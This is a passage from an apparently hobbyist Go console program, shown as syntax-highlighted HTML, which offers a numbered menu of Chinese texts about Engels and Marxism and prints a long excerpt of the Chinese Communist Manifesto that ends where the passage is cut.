class="hljs-string">&quot;是马克思主义理论体系的简称，是关于全世界无产阶级和全人类彻底解放的学说。它由马克思主义哲学、马克思主义政治经济学和科学社会主义三大部分组成，是马克思、恩格斯在批判地继承和吸收人类关于自然科学、思维科学、社会科学优秀成果的基础上于19世纪40年代创立的，并在实践中不断地丰富、发展和完善的无产阶级思想的科学体系。&quot;</span>)<br>&#125;<br><span class="hljs-keyword">if</span> num2==<span class="hljs-number">6</span>&#123;<br>fmt.Println(<span class="hljs-string">&quot;我的好兄弟&quot;</span>)<br>&#125;<br><span class="hljs-keyword">if</span> num2==<span class="hljs-number">7</span>&#123;<br>fmt.Println(<span class="hljs-string">&quot;多去看看马克思主义，或许你能发现一点东西&quot;</span>)<br>&#125;<br><br>&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">egs</span><span class="hljs-params">()</span></span>  &#123;<br>fmt.Println(<span class="hljs-string">&quot;hi,boy or girl. Do you have someting questions talk with me?&quot;</span>)<br>fmt.Println(<span class="hljs-string">&quot;是否切换成中文？Y/N&quot;</span>)<br><span class="hljs-keyword">var</span> str1 <span class="hljs-type">string</span><br>fmt.Scanln(&amp;str1)<br><span class="hljs-keyword">if</span> str1==<span class="hljs-string">&quot;N&quot;</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;我们只有中文模式，见谅见谅&quot;</span>)<br>&#125;<br>fmt.Println(<span class="hljs-string">&quot;年轻人，你好，你有什么问题想和我探讨的嘛&quot;</span>)<br>fmt.Println(<span class="hljs-string">&quot;你想知道什么：&quot;</span>)<br>fmt.Println(<span class="hljs-string">&quot;1.我的传奇一生\n2.我的经典语录\n3.《共产党宣言》\n4.什么是马克思主义\n5.和马克思的关系\n6.处于迷茫时期单纯想和我聊聊&quot;</span>)<br><span class="hljs-keyword">var</span> num2 <span class="hljs-type">int8</span><br><span class="hljs-keyword">for</span> &#123;<br>_,err:=fmt.Scanf(<span class="hljs-string">&quot;%d&quot;</span>,&amp;num2)<br><span class="hljs-keyword">if</span> err == io.EOF &#123;<br><span class="hljs-keyword">break</span><br>&#125;<br><span class="hljs-keyword">if</span> num2==<span class="hljs-number">1</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;恩格斯出生于德国巴门市，家族是当地名门望族，恩格斯的爷爷是市政顾问，妈妈是校长的女儿，\n父亲是工厂主，从小到大恩格斯受的都是宗教教育，很有教养，恩格斯的童年是无忧无虑的。\n他中学是在当地理科学校上的，但是恩格斯特别喜欢文学，虽然做生意的知识恩格斯学的很认真，\n做到了精通商业事务，但是恩格斯最大的兴趣就是写诗，慢慢的迷恋上歌德的诗词，歌德的诗词中告诫人们\n要大量的掌握知识，不要陷入主观的冥想，恩格斯牢牢地记住了歌德的劝告，发奋阅读书籍。恩格斯生平经\n历中记载在 1844年恩格斯在巴黎拜访了马克思，此次见面对双方都有着强烈的好感，两人促膝长谈，发现\n两人在一切的理论方面的意见都能达到一致，之后他们便拥有了牢不可破的友谊，二人一起建立无产阶级理\n论。之后马克思被政府驱逐出境变得一贫如洗，但是恩格斯并没有因为这些原因抛弃马克思，反而把自己的\n稿费寄给马克思，并去做自己最讨厌的生意去赚钱。\n后来马克思逝世，恩格斯照顾起他的家人，把自己的大部分财产给了马克思家人。恩格斯这一生是\n对马克思一家鞠躬尽瘁。恩格斯是一个了不起的马克思主义者，一直坚持发展着马克思主义理论。&quot;</span>)<br>&#125;<br><span class="hljs-keyword">if</span> num2==<span class="hljs-number">2</span> &#123;<br>rand.Seed(time.Now().Unix())<br>rand := rand.Intn(<span class="hljs-number">40</span>)<br><span class="hljs-comment">//fmt.Println(rand)</span><br>fmt.Println(ReadLine2(rand))<br>fmt.Println(<span class="hljs-string">&quot;&quot;</span>)<br>&#125;<br><span class="hljs-keyword">if</span> num2==<span class="hljs-number">3</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;\n      一个幽灵，共产主义的幽灵，在欧洲游荡。为了对这个幽灵进行神圣的围剿，旧欧洲的一切势力，教皇和沙皇、梅特涅和基佐、法国的激进派和德国的警察，都联合起来了。\n　　 有哪一个反对党不被它的当政的敌人骂为共产党呢？又有哪一个反对党不拿共产主义这个罪名去回敬更进步的反对党人和自己的反动敌人呢？\n　　 从这一事实中可以得出两个结论：\n　　 共产主义已经被欧洲的一切势力公认为一种势力；\n　　 现在是共产党人向全世界公开说明自己的观点、自己的目的、自己的意图并且拿党自己的宣言来反驳关于共产主义幽灵的神话的时候了。\n　　 为了这个目的，各国共产党人集会于伦敦，拟定了如下的宣言，用英文、法文、德文、意大利文、弗拉芒文和丹麦文公布于世。\n\n一、资产者和无产者\n\n　　 至今一切社会的历史都是阶级斗争的历史。\n　　 自由民和奴隶、贵族和平民、领主和农奴、行会师傅和帮工，一句话，压迫者和被压迫 者，始终处于相互对立的地位，进行不断的、有时隐蔽有时公开的斗争，而每一次斗争的结局都是整个社会受到革命改造或者斗争的各阶级同归于尽。\n　　 在过去的各个历史时代，我们几乎到处都可以看到社会完全划分为各个不同的等级，看到社会地位分成多种多样的层次。在古罗马，有贵族、骑士、平民、奴隶，在中世纪，有封建主、臣仆、行会师傅、帮工、农奴，而且几乎在每一个阶级内部又有一些特殊的阶层。\n　　 从封建社会的灭亡中产生出来的现代资产阶级社会并没有消灭阶级对立。它只是用新的阶级、新的压迫条件、新的斗争形式代替了旧的。\n　　 但是，我们的时代，资产阶级时代，却有一个特点：它使阶级对立简单化了。整个社会日益分裂为两大敌对的阵营，分裂为两大相互直接对立的阶级：资产阶级和无产阶级。\n　　 从中世纪的农奴中产生了初期城市的城关市民；从这个市民等级中发展出最初的资产阶级分子。\n　　 美洲的发现、绕过非洲的航行，给新兴的资产阶级开辟了新天地。东印度和中国的市场、美洲的殖民化、对殖民地的贸易、交换手段和一般商品的增加，使商业、航海业和工业空前高涨，因而使正在崩溃的封建社会内部的革命因素迅速发展。\n　　 以前那种封建的或行会的工业经营方式已经不能满足随着新市场的出现而增加的需求了。工场手工业代替了这种经营方式。行会师傅被工业的中间等级排挤掉了；各种行业组织之间的分工随着各个作坊内部的分工的出现而消失了。\n　　 但是，市场总是在扩大，需求总是在增加。甚至工场手工业也不再能满足需要了。于是，蒸汽和机器引起了工业生产的革命。现代大工业代替了工场手工业；工业中的百万富翁，一支一支产业大军的首领，现代资产者，代替了工业的中间等级。\n　　 大工业建立了由美洲的发现所准备好的世界市场。世界市场使商业、航海业和陆路交通得到了巨大的发展。这种发展又反过来促进了工业的扩展。同时，随着工业、商业、航海业和铁路的扩展，资产阶级也在同一程度上得到发展，增加自己的资本，把中世纪遗留下来的一切阶级排挤到后面去。\n　　 由此可见，现代资产阶级本身是一个长期发展过程的产物，是生产方式和交换方式的一系列变革的产物。\n　　 资产阶级的这种发展的每一个阶段，都伴随着相应的政治上的进展。它在封建主统治下是被压迫的等级，在公社里是武装的和自治的团体，在一些地方组成独立的城市共和国，在另一些地方组成君主国中的纳税的第三等级；后来，在工场手工业时期，它是等级君主国或专制君主国中同贵族抗衡的势力，而且是大君主国的主要基础；最后，从大工业和世界市场建立的时候起，它在现代的代议制国家里夺得了独占的政治统治。现代的国家政权不过是管理整个资产阶级的共同事务的委员会罢了。\n　　 资产阶级在历史上曾经起过非常革命的作用。\n　　 资产阶级在它已经取得了统治的地方把一切封建的、宗法的和田园般的关系都破坏了。它无情地斩断了把人们束缚于天然尊长的形形色色的封建羁绊，它使人和人之间除了赤裸裸的利害关系，除了冷酷无情的“现金交易”，就再也没有任何别的联系了。它把宗教虔诚、骑士热忱、小市民伤感这些情感的神圣发作，淹没在利己主义打算的冰水之中。它把人的尊严变成了交换价值，用一种没有良心的贸易自由代替了无数特许的和自力挣得的自由。总而言之，它用公开的、无耻的、直接的、露骨的剥削代替了由宗教幻想和政治幻想掩盖着的剥削。\n　　 资产阶级抹去了一切向来受人尊崇和令人敬畏的职业的神圣光环。它把医生、律师、教士、诗人和学者变成了它出钱招雇的雇佣劳动者。\n　　 资产阶级撕下了罩在家庭关系上的温情脉脉的面纱，把这种关系变成了纯粹的金钱关系。 资产阶级揭示了，在中世纪深受反动派称许的那种人力的野蛮使用，是以极端怠惰作为相应补充的。它第一个证明了，人的活动能够取得什么样的成就。它创造了完全不同于埃及金字塔、罗马水道和哥特式教堂的奇迹；它完成了完全不同于民族大迁徙和十字军征讨的远征。\n　　 资产阶级除非对生产工具，从而对生产关系，从而对全部社会关系不断地进行革命，否则就不能生存下去。反之，原封不动地保持旧的生产方式，却是过去的一切工业阶级生存的首要条件。生产的不断变革，一切社会状况不停的动荡，永远的不安定和变动，这就是资产阶级时代不同于过去一切时代的地方。一切固定的僵化的关系以及与之相适应的素被尊崇的观念和见解都被消除了，一切新形成的关系等不到固定下来就陈旧了。一切等级的和固定的东西都烟消云散了，一切神圣的东西都被亵渎了。人们终于不得不用冷静的眼光来看他们的生活地位、他们的相互关系。\n　　 不断扩大产品销路的需要，驱使资产阶级奔走于全球各地。它必须到处落户，到处开发，到处建立联系。\n　　 资产阶级，由于开拓了世界市场，使一切国家的生产和消费都成为世界性的了。使反动派大为惋惜的是，资产阶级挖掉了工业脚下的民族基础。古老的民族工业被消灭了，并且每天都还在被消灭。它们被新的工业排挤掉了，新的工业的建立已经成为一切文明民族的生命攸关的问题；这些工业所加工的，已经不是本地的原料，而是来自极其遥远的地区的原料；它们的产品不仅供本国消费，而且同时供世界各地消费。旧的、靠本国产品来满足的需要，被新的、要靠极其遥远的国家和地带的产品来满足的需要所代替了。过去那种地方的和民族的自给自足和闭关自守状态，被各民族的各方面的互相往来和各方面的互相依赖所代替了。物质的生产是如此，精神的生产也是如此。各民族的精神产品成了公共的财产。民族的片面性和局限性日益成为不可能，于是由许多种民族的和地方的文学形成了一种世界的文学。\n　　 资产阶级，由于一切生产工具的迅速改进，由于交通的极其便利，把一切民族甚至最野蛮的民族都卷到文明中来了。它的商品的低廉价格，是它用来摧毁一切万里长城、征服野蛮人最顽强的仇外心理的重炮。它迫使一切民族——如果它们不想灭亡的话——采用资产阶级的生产方式；它迫使它们在自己那里推行所谓文明，即变成资产者。一句话，它按照自己的面貌为自己创造出一个世界。\n　　 资产阶级使农村屈服于城市的统治。它创立了巨大的城市，使城市人口比农村人口大大增加起来，因而使很大一部分居民脱离了农村生活的愚昧状态。正像它使农村从属于城市一样，它使未开化和半开化的国家从属于文明的国家，使农民的民族从属于资产阶级的民族，使东方从属于西方。\n　　 资产阶级日甚一日地消灭生产资料、财产和人口的分散状态。它使人口密集起来，使生产资料集中起来，使财产聚集在少数人的手里。由此必然产生的结果就是政治的集中。各自独立的、几乎只有同盟关系的、各有不同利益、不同法律、不同政府、不同关税的各个地区，现在已经结合为一个拥有统一的政府、统一的法律、统一的民族阶级利益和统一的关税的统一的民族。\n　　 资产阶级在它的不到一百年的阶级统治中所创造的生产力，比过去一切世代创造的全部生产力还要多，还要大。自然力的征服，机器的采用，化学在工业和农业中的应用，轮船的行驶，铁路的通行，电报的使用，整个整个大陆的开垦，河川的通航，仿佛用法术从地下呼唤出来的大量人口，——过去哪一个世纪料想到在社会劳动里蕴藏有这样的生产力呢？\n　　 由此可见，资产阶级赖以形成的生产资料和交换手段，是在封建社会里造成的。在这些生产资料和交换手段发展的一定阶段上，封建社会的生产和交换在其中进行的关系，封建的农业和工场手工业组织，一句话，封建的所有制关系，就不再适应已经发展的生产力了。这种关系已经在阻碍生产而不是促进生产了。它变成了束缚生产的桎梏。它必须被炸毁，它已经被炸毁了。\n　　 起而代之的是自由竞争以及与自由竞争相适应的社会制度和政治制度、资产阶级的经济统治和政治统治。\n　　 现在，我们眼前又进行着类似的运动。资产阶级的生产关系和交换关系，资产阶级的所有制关系，这个曾经仿佛用法术创造了如此庞大的生产资料和交换手段的现代资产阶级社会，现在像一个魔法师一样不能再支配自己用法术呼唤出来的魔鬼了。几十年来的工业和商业的历史，只不过是现代生产力反抗现代生产关系、反抗作为资产阶级及其统治的存在条件的所有制关系的历史。只要指出在周期性的重复中越来越危及整个资产阶级社会生存的商业危机就够了。在商业危机期间，总是不仅有很大一部分制成的产品被毁灭掉，而且有很大一部分已经造成的生产力被毁灭掉。在危机期间，发生一种在过去一切时代看来都好像是荒唐现象的社会瘟疫，即生产过剩的瘟疫。社会突然发现自己回到了一时的野蛮状态；仿佛是一次饥荒、一场普遍的毁灭性战争，使社会失去了全部生活资料；仿佛是工业和商业全被毁灭了，——这是什么缘故呢？因为社会上文明过度，生活资料太多，工业和商业太发达。社会所拥有的生产力已经不能再促进资产阶级文明和资产阶级所有制关系的发展；相反，生产力已经强大到这种关系所不能适应的地步，它已经受到这种关系的阻碍；而它一着手克服这种障碍，就使整个资产阶级社会陷入混乱，就使资产阶级所有制的存在受到威胁。资产阶级的关系已经太狭窄了，再容纳不了它本身所造成的财富了。——资产阶级用什么办法来克服这种危机呢？一方面不得不消灭大量生产力，另一方面夺取新的市场，更加彻底地利用旧的市场。这究竟是怎样的一种办法呢？这不过是资产阶级准备更全面更猛烈的危机的办法，不过是使防止危机的手段越来越少的办法。\n　　 资产阶级用来推翻封建制度的武器，现在却对准资产阶级自己了。\n　　 但是，资产阶级不仅锻造了置自身于死地的武器；它还产生了将要运用这种武器的人——现代的工人，即无产者。\n　　 随着资产阶级即资本的发展，无产阶级即现代工人阶级也在同一程度上得到发展；现代的工人只有当他们找到工作的时候才能生存，而且只有当他们的劳动增殖资本的时候才能找到工作。这些不得不把自己零星出卖的工人，像其他任何货物一样，也是一种商品，所以他们同样地受到竞争的一切变化、市场的一切波动的影响。\n　　 由于推广机器和分工，无产者的劳动已经失去了任何独立的性质，因而对工人也失去了任何吸引力。工人变成了机器的单纯的附属品，要求他做的只是极其简单、极其单调和极容易学会的操作。因此，花在工人身上的费用，几乎只限于维持工人生活和延续工人后代所必需的生活资料。但是，商品的价格，从而劳动的价格，是同它的生产费用相等的。因此，劳动越使人感到厌恶，工资也就越少。不仅如此，机器越推广，分工越细致，劳动量出就越增加，这或者是由于工作时间的延长，或者是由于在一定时间内所要求的劳动的增加，机器运转的加速，等等。\n　　 现代工业已经把家长式的师傅的小作坊变成了工业资本家的大工厂。挤在工厂里的工人群众就像士兵一样被组织起来。他们是产业军的普通士兵，受着各级军士和军官的层层监视。他们不仅仅是资产阶级的、资产阶级国家的奴隶，他们每日每时都受机器、受监工、首先是受各个经营工厂的资产者本人的奴役。这种专制制度越是公开地把营利宣布为自己的最终目的，它就越是可鄙、可恨和可恶。\n　　 手的操作所要求的技巧和气力越少，换句话说，现代工业越发达，男工也就越受到女工和童工的排挤。对工人阶级来说，性别和年龄的差别再没有什么社会意义了。他们都只是劳动工具，不过因为年龄和性别的不同而需要不同的费用罢了。\n　　 当厂主对工人的剥削告一段落，工人领到了用现钱支付的工资的时候，马上就有资产阶级中的另一部分人——房东、小店主、当铺老板等等向他们扑来。\n　　 以前的中间等级的下层，即小工业家、小商人和小食利者，手工业者和农民——所有这些阶级都降落到无产阶级的队伍里来了，有的是因为他们的小资本不足以经营大工业，经不起较大的资本家的竞争；有的是因为他们的手艺已经被新的生产方法弄得不值钱了。无产阶级就是这样从居民的所有阶级中得到补充的。\n　　 无产阶级经历了各个不同的发展阶段。它反对资产阶级的斗争是和它的存在同时开始的。\n　　 最初是单个的工人，然后是某一工厂的工人，然后是某一地方的某一劳动部门的工人，同直接剥削他们的单个资产者作斗争。他们不仅仅攻击资产阶级的生产关系，而且攻击生产工具本身；他们毁坏那些来竞争的外国商品，捣毁机器，烧毁工厂，力图恢复已经失去的中世纪工人的地位。\n　　 在这个阶段上，工人是分散在全国各地并为竞争所分裂的群众。工人的大规模集结，还不是他们自己联合的结果，而是资产阶级联合的结果，当时资产阶级为了达到自己的政治目的必须而且暂时还能够把整个无产阶级发动起来。因此，在这个阶段上，无产者不是同自己的敌人作斗争，而是同自己的敌人的敌人作斗争，即同专制君主制的残余、地主、非工业资产者和小资产者作斗争。因此，整个历史运动都集中在资产阶级手里；在这种条件下取得的每一个胜利都是资产阶级的胜利。\n　　 但是，随着工业的发展，无产阶级不仅人数增加了，而且它结合成更大的集体，它的力量日益增长，它越来越感觉到自己的力量。机器使劳动的差别越来越小，使工资几乎到处都降到同样低的水平，因而无产阶级内部的利益、生活状况也越来越趋于一致。资产者彼此间日益加剧的竞争以及由此引起的商业危机，使工人的工资越来越不稳定；机器的日益迅速的和继续不断的改良，使工人的整个生活地位越来越没有保障；单个工人和单个资产者之间的冲突越来越具有两个阶级的冲突的性质。工人开始成立反对资产者的同盟；他们联合起来保卫自己的工资。他们甚至建立了经常性的团体，以便为可能发生的反抗准备食品。有些地方，斗争爆发为起义。\n　　 工人有时也得到胜利，但这种胜利只是暂时的。他们斗争的真正成果并不是直接取得的成功，而是工人的越来越扩大的联合。这种联合由于大工业所造成的日益发达的交通工具而得到发展，这种交通工具把各地的工人彼此联系起来。只要有了这种联系，就能把许多性质相同的地方性的斗争汇合成全国性的斗争，汇合成阶级斗争。而一切阶级斗争都是政治斗争。中世纪的市民靠乡间小道需要几百年才能达到的联合，现代的无产者利用铁路只要几年就可以达到了。\n　　 无产者组织成为阶级，从而组织成为政党这件事，不断地由于工人的自相竞争而受到破坏。但是，这种组织总是重新产生，并且一次比一次更强大，更坚固，更有力。它利用资产阶级内部的分裂，迫使他们用法律形式承认工人的个别利益。英国的十小时工作日法案就是一个例子。\n　　 旧社会内部的所有冲突在许多方面都促进了无产阶级的发展。资产阶级处于不断的斗争中：最初反对贵族；后来反对同工业进步有利害冲突的那部分资产阶级；经常反对一切外国的资产阶级。在这一切斗争中，资产阶级都不得不向无产阶级呼吁，要求无产阶级援助，这样就把无产阶级卷进了政治运动。于是，资产阶级自己就把自己的教育因素即反对自身的武器给予了无产阶级。\n　　 其次，我们已经看到，工业的进步把统治阶级的整批成员抛到无产阶级队伍里去，或者至少也使他们的生活条件受到威胁。他们也给无产阶级带来了大量的教育因素。\n　　 最后，在阶级斗争接近决战的时期，统治阶级内部的、整个旧社会内部的瓦解过程，就达到非常强烈、非常尖锐的程度，甚至使得统治阶级中的一小部分人脱离统治阶级而归附于革命的阶级，即掌握着未来的阶级。所以，正像过去贵族中有一部分人转到资产阶级方面一样，现在资产阶级中也有一部分人，特别是已经提高到从理论上认识整个历史运动这一水平的一部分资产阶级思想家，转到无产阶级方面来了。\n　　 在当前同资产阶级对立的一切阶级中，只有无产阶级是真正革命的阶级。其余的阶级都随着大工业的发展而日趋没落和灭亡，无产阶级却是大工业本身的产物。\n　　 中间等级，即小工业家、小商人、手工业者、农民，他们同资产阶级作斗争，都是为了维护他们这种中间等级的生存，以免于灭亡。所以，他们不是革命的，而是保守的。不仅如此，他们甚至是反动的，因为他们力图使历史的车轮倒转。如果说他们是革命的，那是鉴于他们行将转入无产阶级的队伍，这样，他们就不是维护他们目前的利益，而是维护他们将来的利益，他们就离开自己原来的立场，而站到无产阶级的立场上来。\n　　 流氓无产阶级是旧社会最下层中消极的腐化的部分，他们在一些地方也被无产阶级革命卷到运动里来，但是，由于他们的整个生活状况，他们更甘心于被人收买，去干反动的勾当。\n　　 在无产阶级的生活条件中，旧社会的生活条件已经被消灭了。无产者是没有财产的；他们和妻子儿女的关系同资产阶级的家庭关系再没有任何共同之处了；现代的工业劳动，现代的资本压迫，无论在英国或法国，无论在美国或德国，都有是一样的，都使无产者失去了任何民族性。法律、道德、宗教在他们看来全都是资产阶级偏见，隐藏在这些偏见后面的全都是资产阶级利益。\n　　 过去一切阶级在争得统治之后，总是使整个社会服从于它们发财致富的条件，企图以此来巩固它们已获得的生活地位。无产者只有废除自己的现存的占有方式，从而废除全部现存的占有方式，才能取得社会生产力。无产者没有什么自己的东西必须加以保护，他们必须摧毁至今保护和保障私有财产的一切。\n　　 过去的一切运动都是少数人的或者为少数人谋利益的运动。无产阶级的运动是绝大多数人的、为绝大多数人谋利益的独立的运动。无产阶级，现今社会的最下层，如果不炸毁构成官方社会的整个上层，就不能抬起头来，挺起胸来。\n　　 如果不就内容而就形式来说，无产阶级反对资产阶级的斗争首先是一国范围内的斗争。每一个国家的无产阶级当然首先应该打倒本国的资产阶级。\n　　 在叙述无产阶级发展的最一般的阶段的时候，我们循序探讨了现存社会内部或多或少隐蔽着的国内战争，直到这个战争爆发为公开的革命，无产阶级用暴力推翻资产阶级而建立自己的统治。\n　　 我们已经看到，至今的一切社会都是建立在压迫阶级和被压迫阶级的对立之上的。但是，为了有可能压迫一个阶级，就必须保证这个阶级至少有能够勉强维持它的奴隶般的生存的条件。农奴曾经在农奴制度下挣扎到公社成员的地位，小资产者曾经在封建专制制度的束缚下挣扎到资产者的地位。现代的工人却相反，他们并不是随着工业的进步而上升，而是越来越降到本阶级的生存条件以下。工人变成赤贫者，贫困比人口和财富增长得还要快。由此可以明显地看出，资产阶级再不能做社会的统治阶级了，再不能把自己阶级的生存条件当作支配一切的规律强加于社会了。资产阶级不能统治下去了，因为它甚至不能保证自己的奴隶维持奴隶的生活，因为它不得不让自己的奴隶落到不能养活它反而要它来养活的地步。社会再不能在它统治下生存下去了，就是说，它的生存不再同社会相容了。\n　　 资产阶级生存和统治的根本条件，是财富在私人手里的积累，是资本的形成和增殖；资本的条件是雇佣劳动。雇佣劳动完全是建立在工人的自相竞争之上的。资产阶级无意中造成而又无力抵抗的工业进步，使工人通过结社而达到的革命联合代替了他们由于竞争而造成的分散状态。于是，随着大工业的发展，资产阶级赖以生产和占有产品的基础本身也就从它的脚下被挖掉了。它首先生产的是它自身的掘墓人。资产阶级的灭亡和无产阶级的胜利是同样不可避免的。\n\n\n二、无产者和共产党人\n\n共产党人同全体无产者的关系是怎样的呢？\n　　 共产党人不是同其他工人政党相对立的特殊政党。\n　　 他们没有任何同整个无产阶级的利益不同的利益。\n　　 他们不提出任何特殊的原则，用以塑造无产阶级的运动。\n　　 共产党人同其他无产阶级政党不同的地方只是：一方面，在无产者不同的民族的斗争中，共产党人强调和坚持整个无产阶级共同的不分民族的利益；另一方面，在无产阶级和资产阶级的斗争所经历的各个发展阶段上，共产党人始终代表整个运动的利益。\n　　 因此，在实践方面，共产党人是各国工人政党中最坚决的、始终起推动作用的部分；在理论方面，他们胜过其余无产阶级群众的地方在于他们了解无产阶级运动的条件、进程和一般结果。\n　　 共产党人的最近目的是和其他一切无产阶级政党的最近目的一样的：使无产阶级形成为阶级，推翻资产阶级的统治，由无产阶级夺取政权。\n　　 共产党人的理论原理，决不是以这个或那个世界改革家所发明或发现的思想、原则为根据的。\n　　 这些原理 不过是现存的阶级斗争、我们眼前的历史运动的真实关系的一般表述。废除先前存在的所有制关系，并不是共产主义所独具的特征。\n　　 一切所有制关系都经历了经常的历史更替、经常的历史变更。\n　　 例如，法国革命废除了封建的所有制，代之以资产阶级的所有制。\n　　 共产主义的特征并不是要废除一般的所有制，而是要废除资产阶级的所有制。\n　　 但是，现代的资产阶级私有制是建立在阶级对立上面、建立在一些人对另一些人的剥削上面的产品生产和占有的最后而又完备的表现。\n　　 从这个意义上说，共产党人可以把自己的理论概括为一句话：消灭私有制。\n　　 有人责备我们共产党人，说我们消灭个人挣得的、自己劳动得来的财产，要消灭构成个人的一切自由、活动和独立的基础的财产。\n　　 好一个劳动得来的、自己挣得的、自己赚来的财产！你们说的是资产阶级财产出现以前的那种小资产阶级、小农的财产吗？那种财产用不着我们去消灭，工业的发展已经把它消灭了，而且每天都在消灭它。\n　　 或者，你们说的是现代的资产阶级的私有财产吧？\n　　 但是，难道雇佣劳动，无产者的劳动，会给无产者创造出财产来吗？没有的事。这种劳动所创造的资本，即剥削雇佣劳动的财产，只有在不断产生出新的雇佣劳动来重新加以剥削的条件下才能增殖的财产。现今的这种财产是在资本和雇佣劳动的对立中运动的。让我们来看看这种对立的两个方面吧。\n　　 做一个资本家，这就是说，他在生产中不仅占有一种纯粹个人的地位，而且占有一种社会地位。资本是集体的产物，它只有通过社会许多成员的共同活动，而且归根到底只有通过社会全体成员的共同活动，才能运动起来。\n　　 因此，资本不是一种个人力量，而是一种社会力量。\n　　 因此，把资本变为公共的、属于社会全体成员的财产，这并不是把个人财产变为社会财产。这里所改变的只是财产的社会性质。它将失掉它的阶级性质。\n　　 现在，我们来看看雇佣劳动。\n　　 雇佣劳动的平均价格是最低限度的工资，即工人为维持其工人的生活所必需的生活资料的数额。因此，雇佣工人靠自己的劳动所占有的东西，只够勉强维持他的生命的再生产。我们决不打算消灭这种供直接生命再生产用的劳动产品的个人占有，这种占有并不会留下任何剩余的东西使人们有可能支配别人的劳动。我们要消灭的只是这种占有的可怜的性质，在这种占有下，工人仅仅为增殖资本而活着，只有在统治阶级的利益需要他活着的时候才能活着。\n　　 在资产阶级社会里，活的劳动只是增殖已经积累起来的劳动的一种手段。在共产主义社会里，已经积累起来的劳动只是扩大、丰富和提高工人的生活的一种手段。\n　　 因此，在资产阶级社会里是过去支配现在，在共产主义社会里是现在支配过去。在资产阶级社会里，资本具有独立性和个性，而活动着的个人却没有独立性和个性。\n　　 而资产阶级却把消灭这种关系说成是消灭个性和自由！说对了。的确，正是要消灭资产者的个性、独立性和自由。\n　　 在现今的资产阶级生产关系的范围内，所谓自由就是自由贸易，自由买卖。 　\n　　 但是，买卖一消失，自由买卖也就会消失。关于自由买卖的言论，也像我们的资产阶级的其他一切关于自由的大话一样，仅仅对于不自由的买卖来说，对于中世纪被奴役的市民来说，才是有意义的，而对于共产主义要消灭买卖、消灭资产阶级生产关系和资产阶级本身这一点来说，却是毫无意义的。\n　　 我们要消灭私有制，你们就惊慌起来。但是，在你们的现存社会里，私有财产对十分之九的成员来说已经被消灭了；这种私有制这所以存在，正是因为私有财产对十分之九的成员来说已经不存在。可见，你们责备我们，是说我们要消灭那种以社会上的绝大多数人没有财产为必要条件的所有制。\n　　 总而言之，你们责备我们，是说我们要消灭你们的那种所有制。的确，我们是要这样做的。\n　　 从劳动不再能变为资本、货币、地租，一句话，不再能变为可以垄断的社会力量的时候起，就是说，从个人财产不再能变为资产阶级财产的时候起，你们说，个性被消灭了。\n　　 由此可见，你们是承认，你们所理解的个性，不外是资产者、资产阶级私有者。这样的个性确实应当被消灭。\n　　 共产主义并不剥夺任何人占有社会产品的权力，它只剥夺利用这种占有去奴役他人劳动的权力。\n　　 有人反驳说，私有制一消灭，一切活动就会停止，懒惰之风就会兴起。\n　　 这样说来，资产阶级社会早就应该因懒惰而灭亡了，因为在这个社会里劳者不获，获者不劳。所有这些顾虑，都可以归结为这样一个同义反复：一旦没有资本，也就不再有雇佣劳动了。\n　　 所有这些对共产主义的物质产品的占有方式和生产方式的责备，也被扩及到精神产品的占有和生产方面。正如阶级的所有制的终止在资产者看来是生产本身的终止一样，阶级的教育的终止在他们看来就等于一切教育的终止。\n　　 资产者唯恐失去的那种教育，绝大多数人来说是把人训练成机器。\n　　 但是，你们既然用你们资产阶级关于自由、教育、法等等的观念来衡量废除资产阶级所有制的主张，那就请你们不要同我们争论了。你们的观念本身是资产阶级的生产关系和所有制关系的产物，正像你们的法不过是被奉为法律的你们这个阶级的意志一样，而这种意志的内容是由你们这个阶级的物质生活条件决定的。\n　　 你们的利己观念使你们把自己的生产关系和所有制关系从历史的、在生产过程中是暂时的关系变成永恒的自然规律和理性规律，这种利己观念是你们和一切灭亡了的统治阶级所共有的。谈到古代所有制的时候你们所能理解的，谈到封建所有制的时候你们所能理解的，一谈到资产阶级所有制你们就再也不能理解了。\n　　 消灭家庭！连极端的激进派也对共产党人的这种可耻的意图表示愤慨。\n　　 现代的、资产阶级的家庭是建立在什么基础上的呢？是建立在资本上面，建立在私人发财上面的。这种家庭只是在资产阶级那里才以充分发展的形式存在着，而无产者的被迫独居和公开的卖淫则是它的补充。\n　　 资产者的家庭自然会随着它的这种补充的消失而消失，两者都要随着资本的消失而消失。\n　　 你们是责备我们要消灭父母对子女的剥削吗？我们承认这种罪状。\n　　 但是，你们说，我们用社会教育代替家庭教育，就是要消灭人们最亲密的关系。\n　　 而你们的教育不也是由社会决定的吗？不也是由你们进行教育时所处的那种社会关系决定的吗？不也是由社会通过学校等等进行的直接的或间接的干涉决定的吗？共产党人并没有发明社会对教育的作用；他们仅仅是要改变这种作用的性质，要使教育摆脱统治阶级的影响。\n　　 无产者的一切家庭联系越是由于大工业的发展而被破坏，他们的子女越是由于这种发展而被变成单纯的商品和劳动工具，资产阶级关于家庭和教育、关于父母和子女的亲密关系的空话就越是令人作呕。\n　　 但是，你们共产党人是要实行公妻制的啊，——整个资产阶级异口同声地向我们这样叫喊。\n　　 资产者是把自己的妻子看作单纯的生产工具的。他们听说生产工具将要公共使用，自然就不能不想到妇女也会遭到同样的命运。\n　　 他们想也没有想到，问题正在于使妇女不再处于单纯生产工具的地位。\n　　 其实，我们的资产者装得道貌岸然，对所谓的共产党人的正式公妻制表示惊讶，那是再可笑不过了。公妻制无需共产党人来实行，它差不多是一向就有的。\n　　 我们的资产者不以他们的无产者的妻子和女儿受他们支配为满足，正式的卖淫更不必说了，他们还以互相诱奸妻子为最大的享乐。 资产阶级的婚姻实际上是公妻制。人们至多只能责备共产党人，说他们想用正式的、公开的公妻制来代替伪善地掩蔽着的公妻制。其实，不言而喻，随着现在的生产关系的消灭，从这种关系中产生的公妻制，即正式的和非正式的卖淫，也就消失了。\n　　 有人还责备共产党人，说他们要取消祖国，取消民族。\n　　 工人没有祖国。决不能剥夺他们所没有的东西。因为无产阶级首先必须取得政治统治，上升为民族的阶级，把自身组织成为民族，所以它本身还是民族的，虽然完全不是资产阶级所理解的那种意思。\n　　 随着资产阶级的发展，随着贸易自由的实现和世界市场的建立，随着工业生产以及与之相适应的生活条件的趋于一致，各国人民之间的民族分隔和对立日益消失。\n　　 无产阶级的统治将使它们更快地消失。联合的行动，至少是各文明国家的联合的行动，是无产阶级获得解放的首要条件之一。\n　　 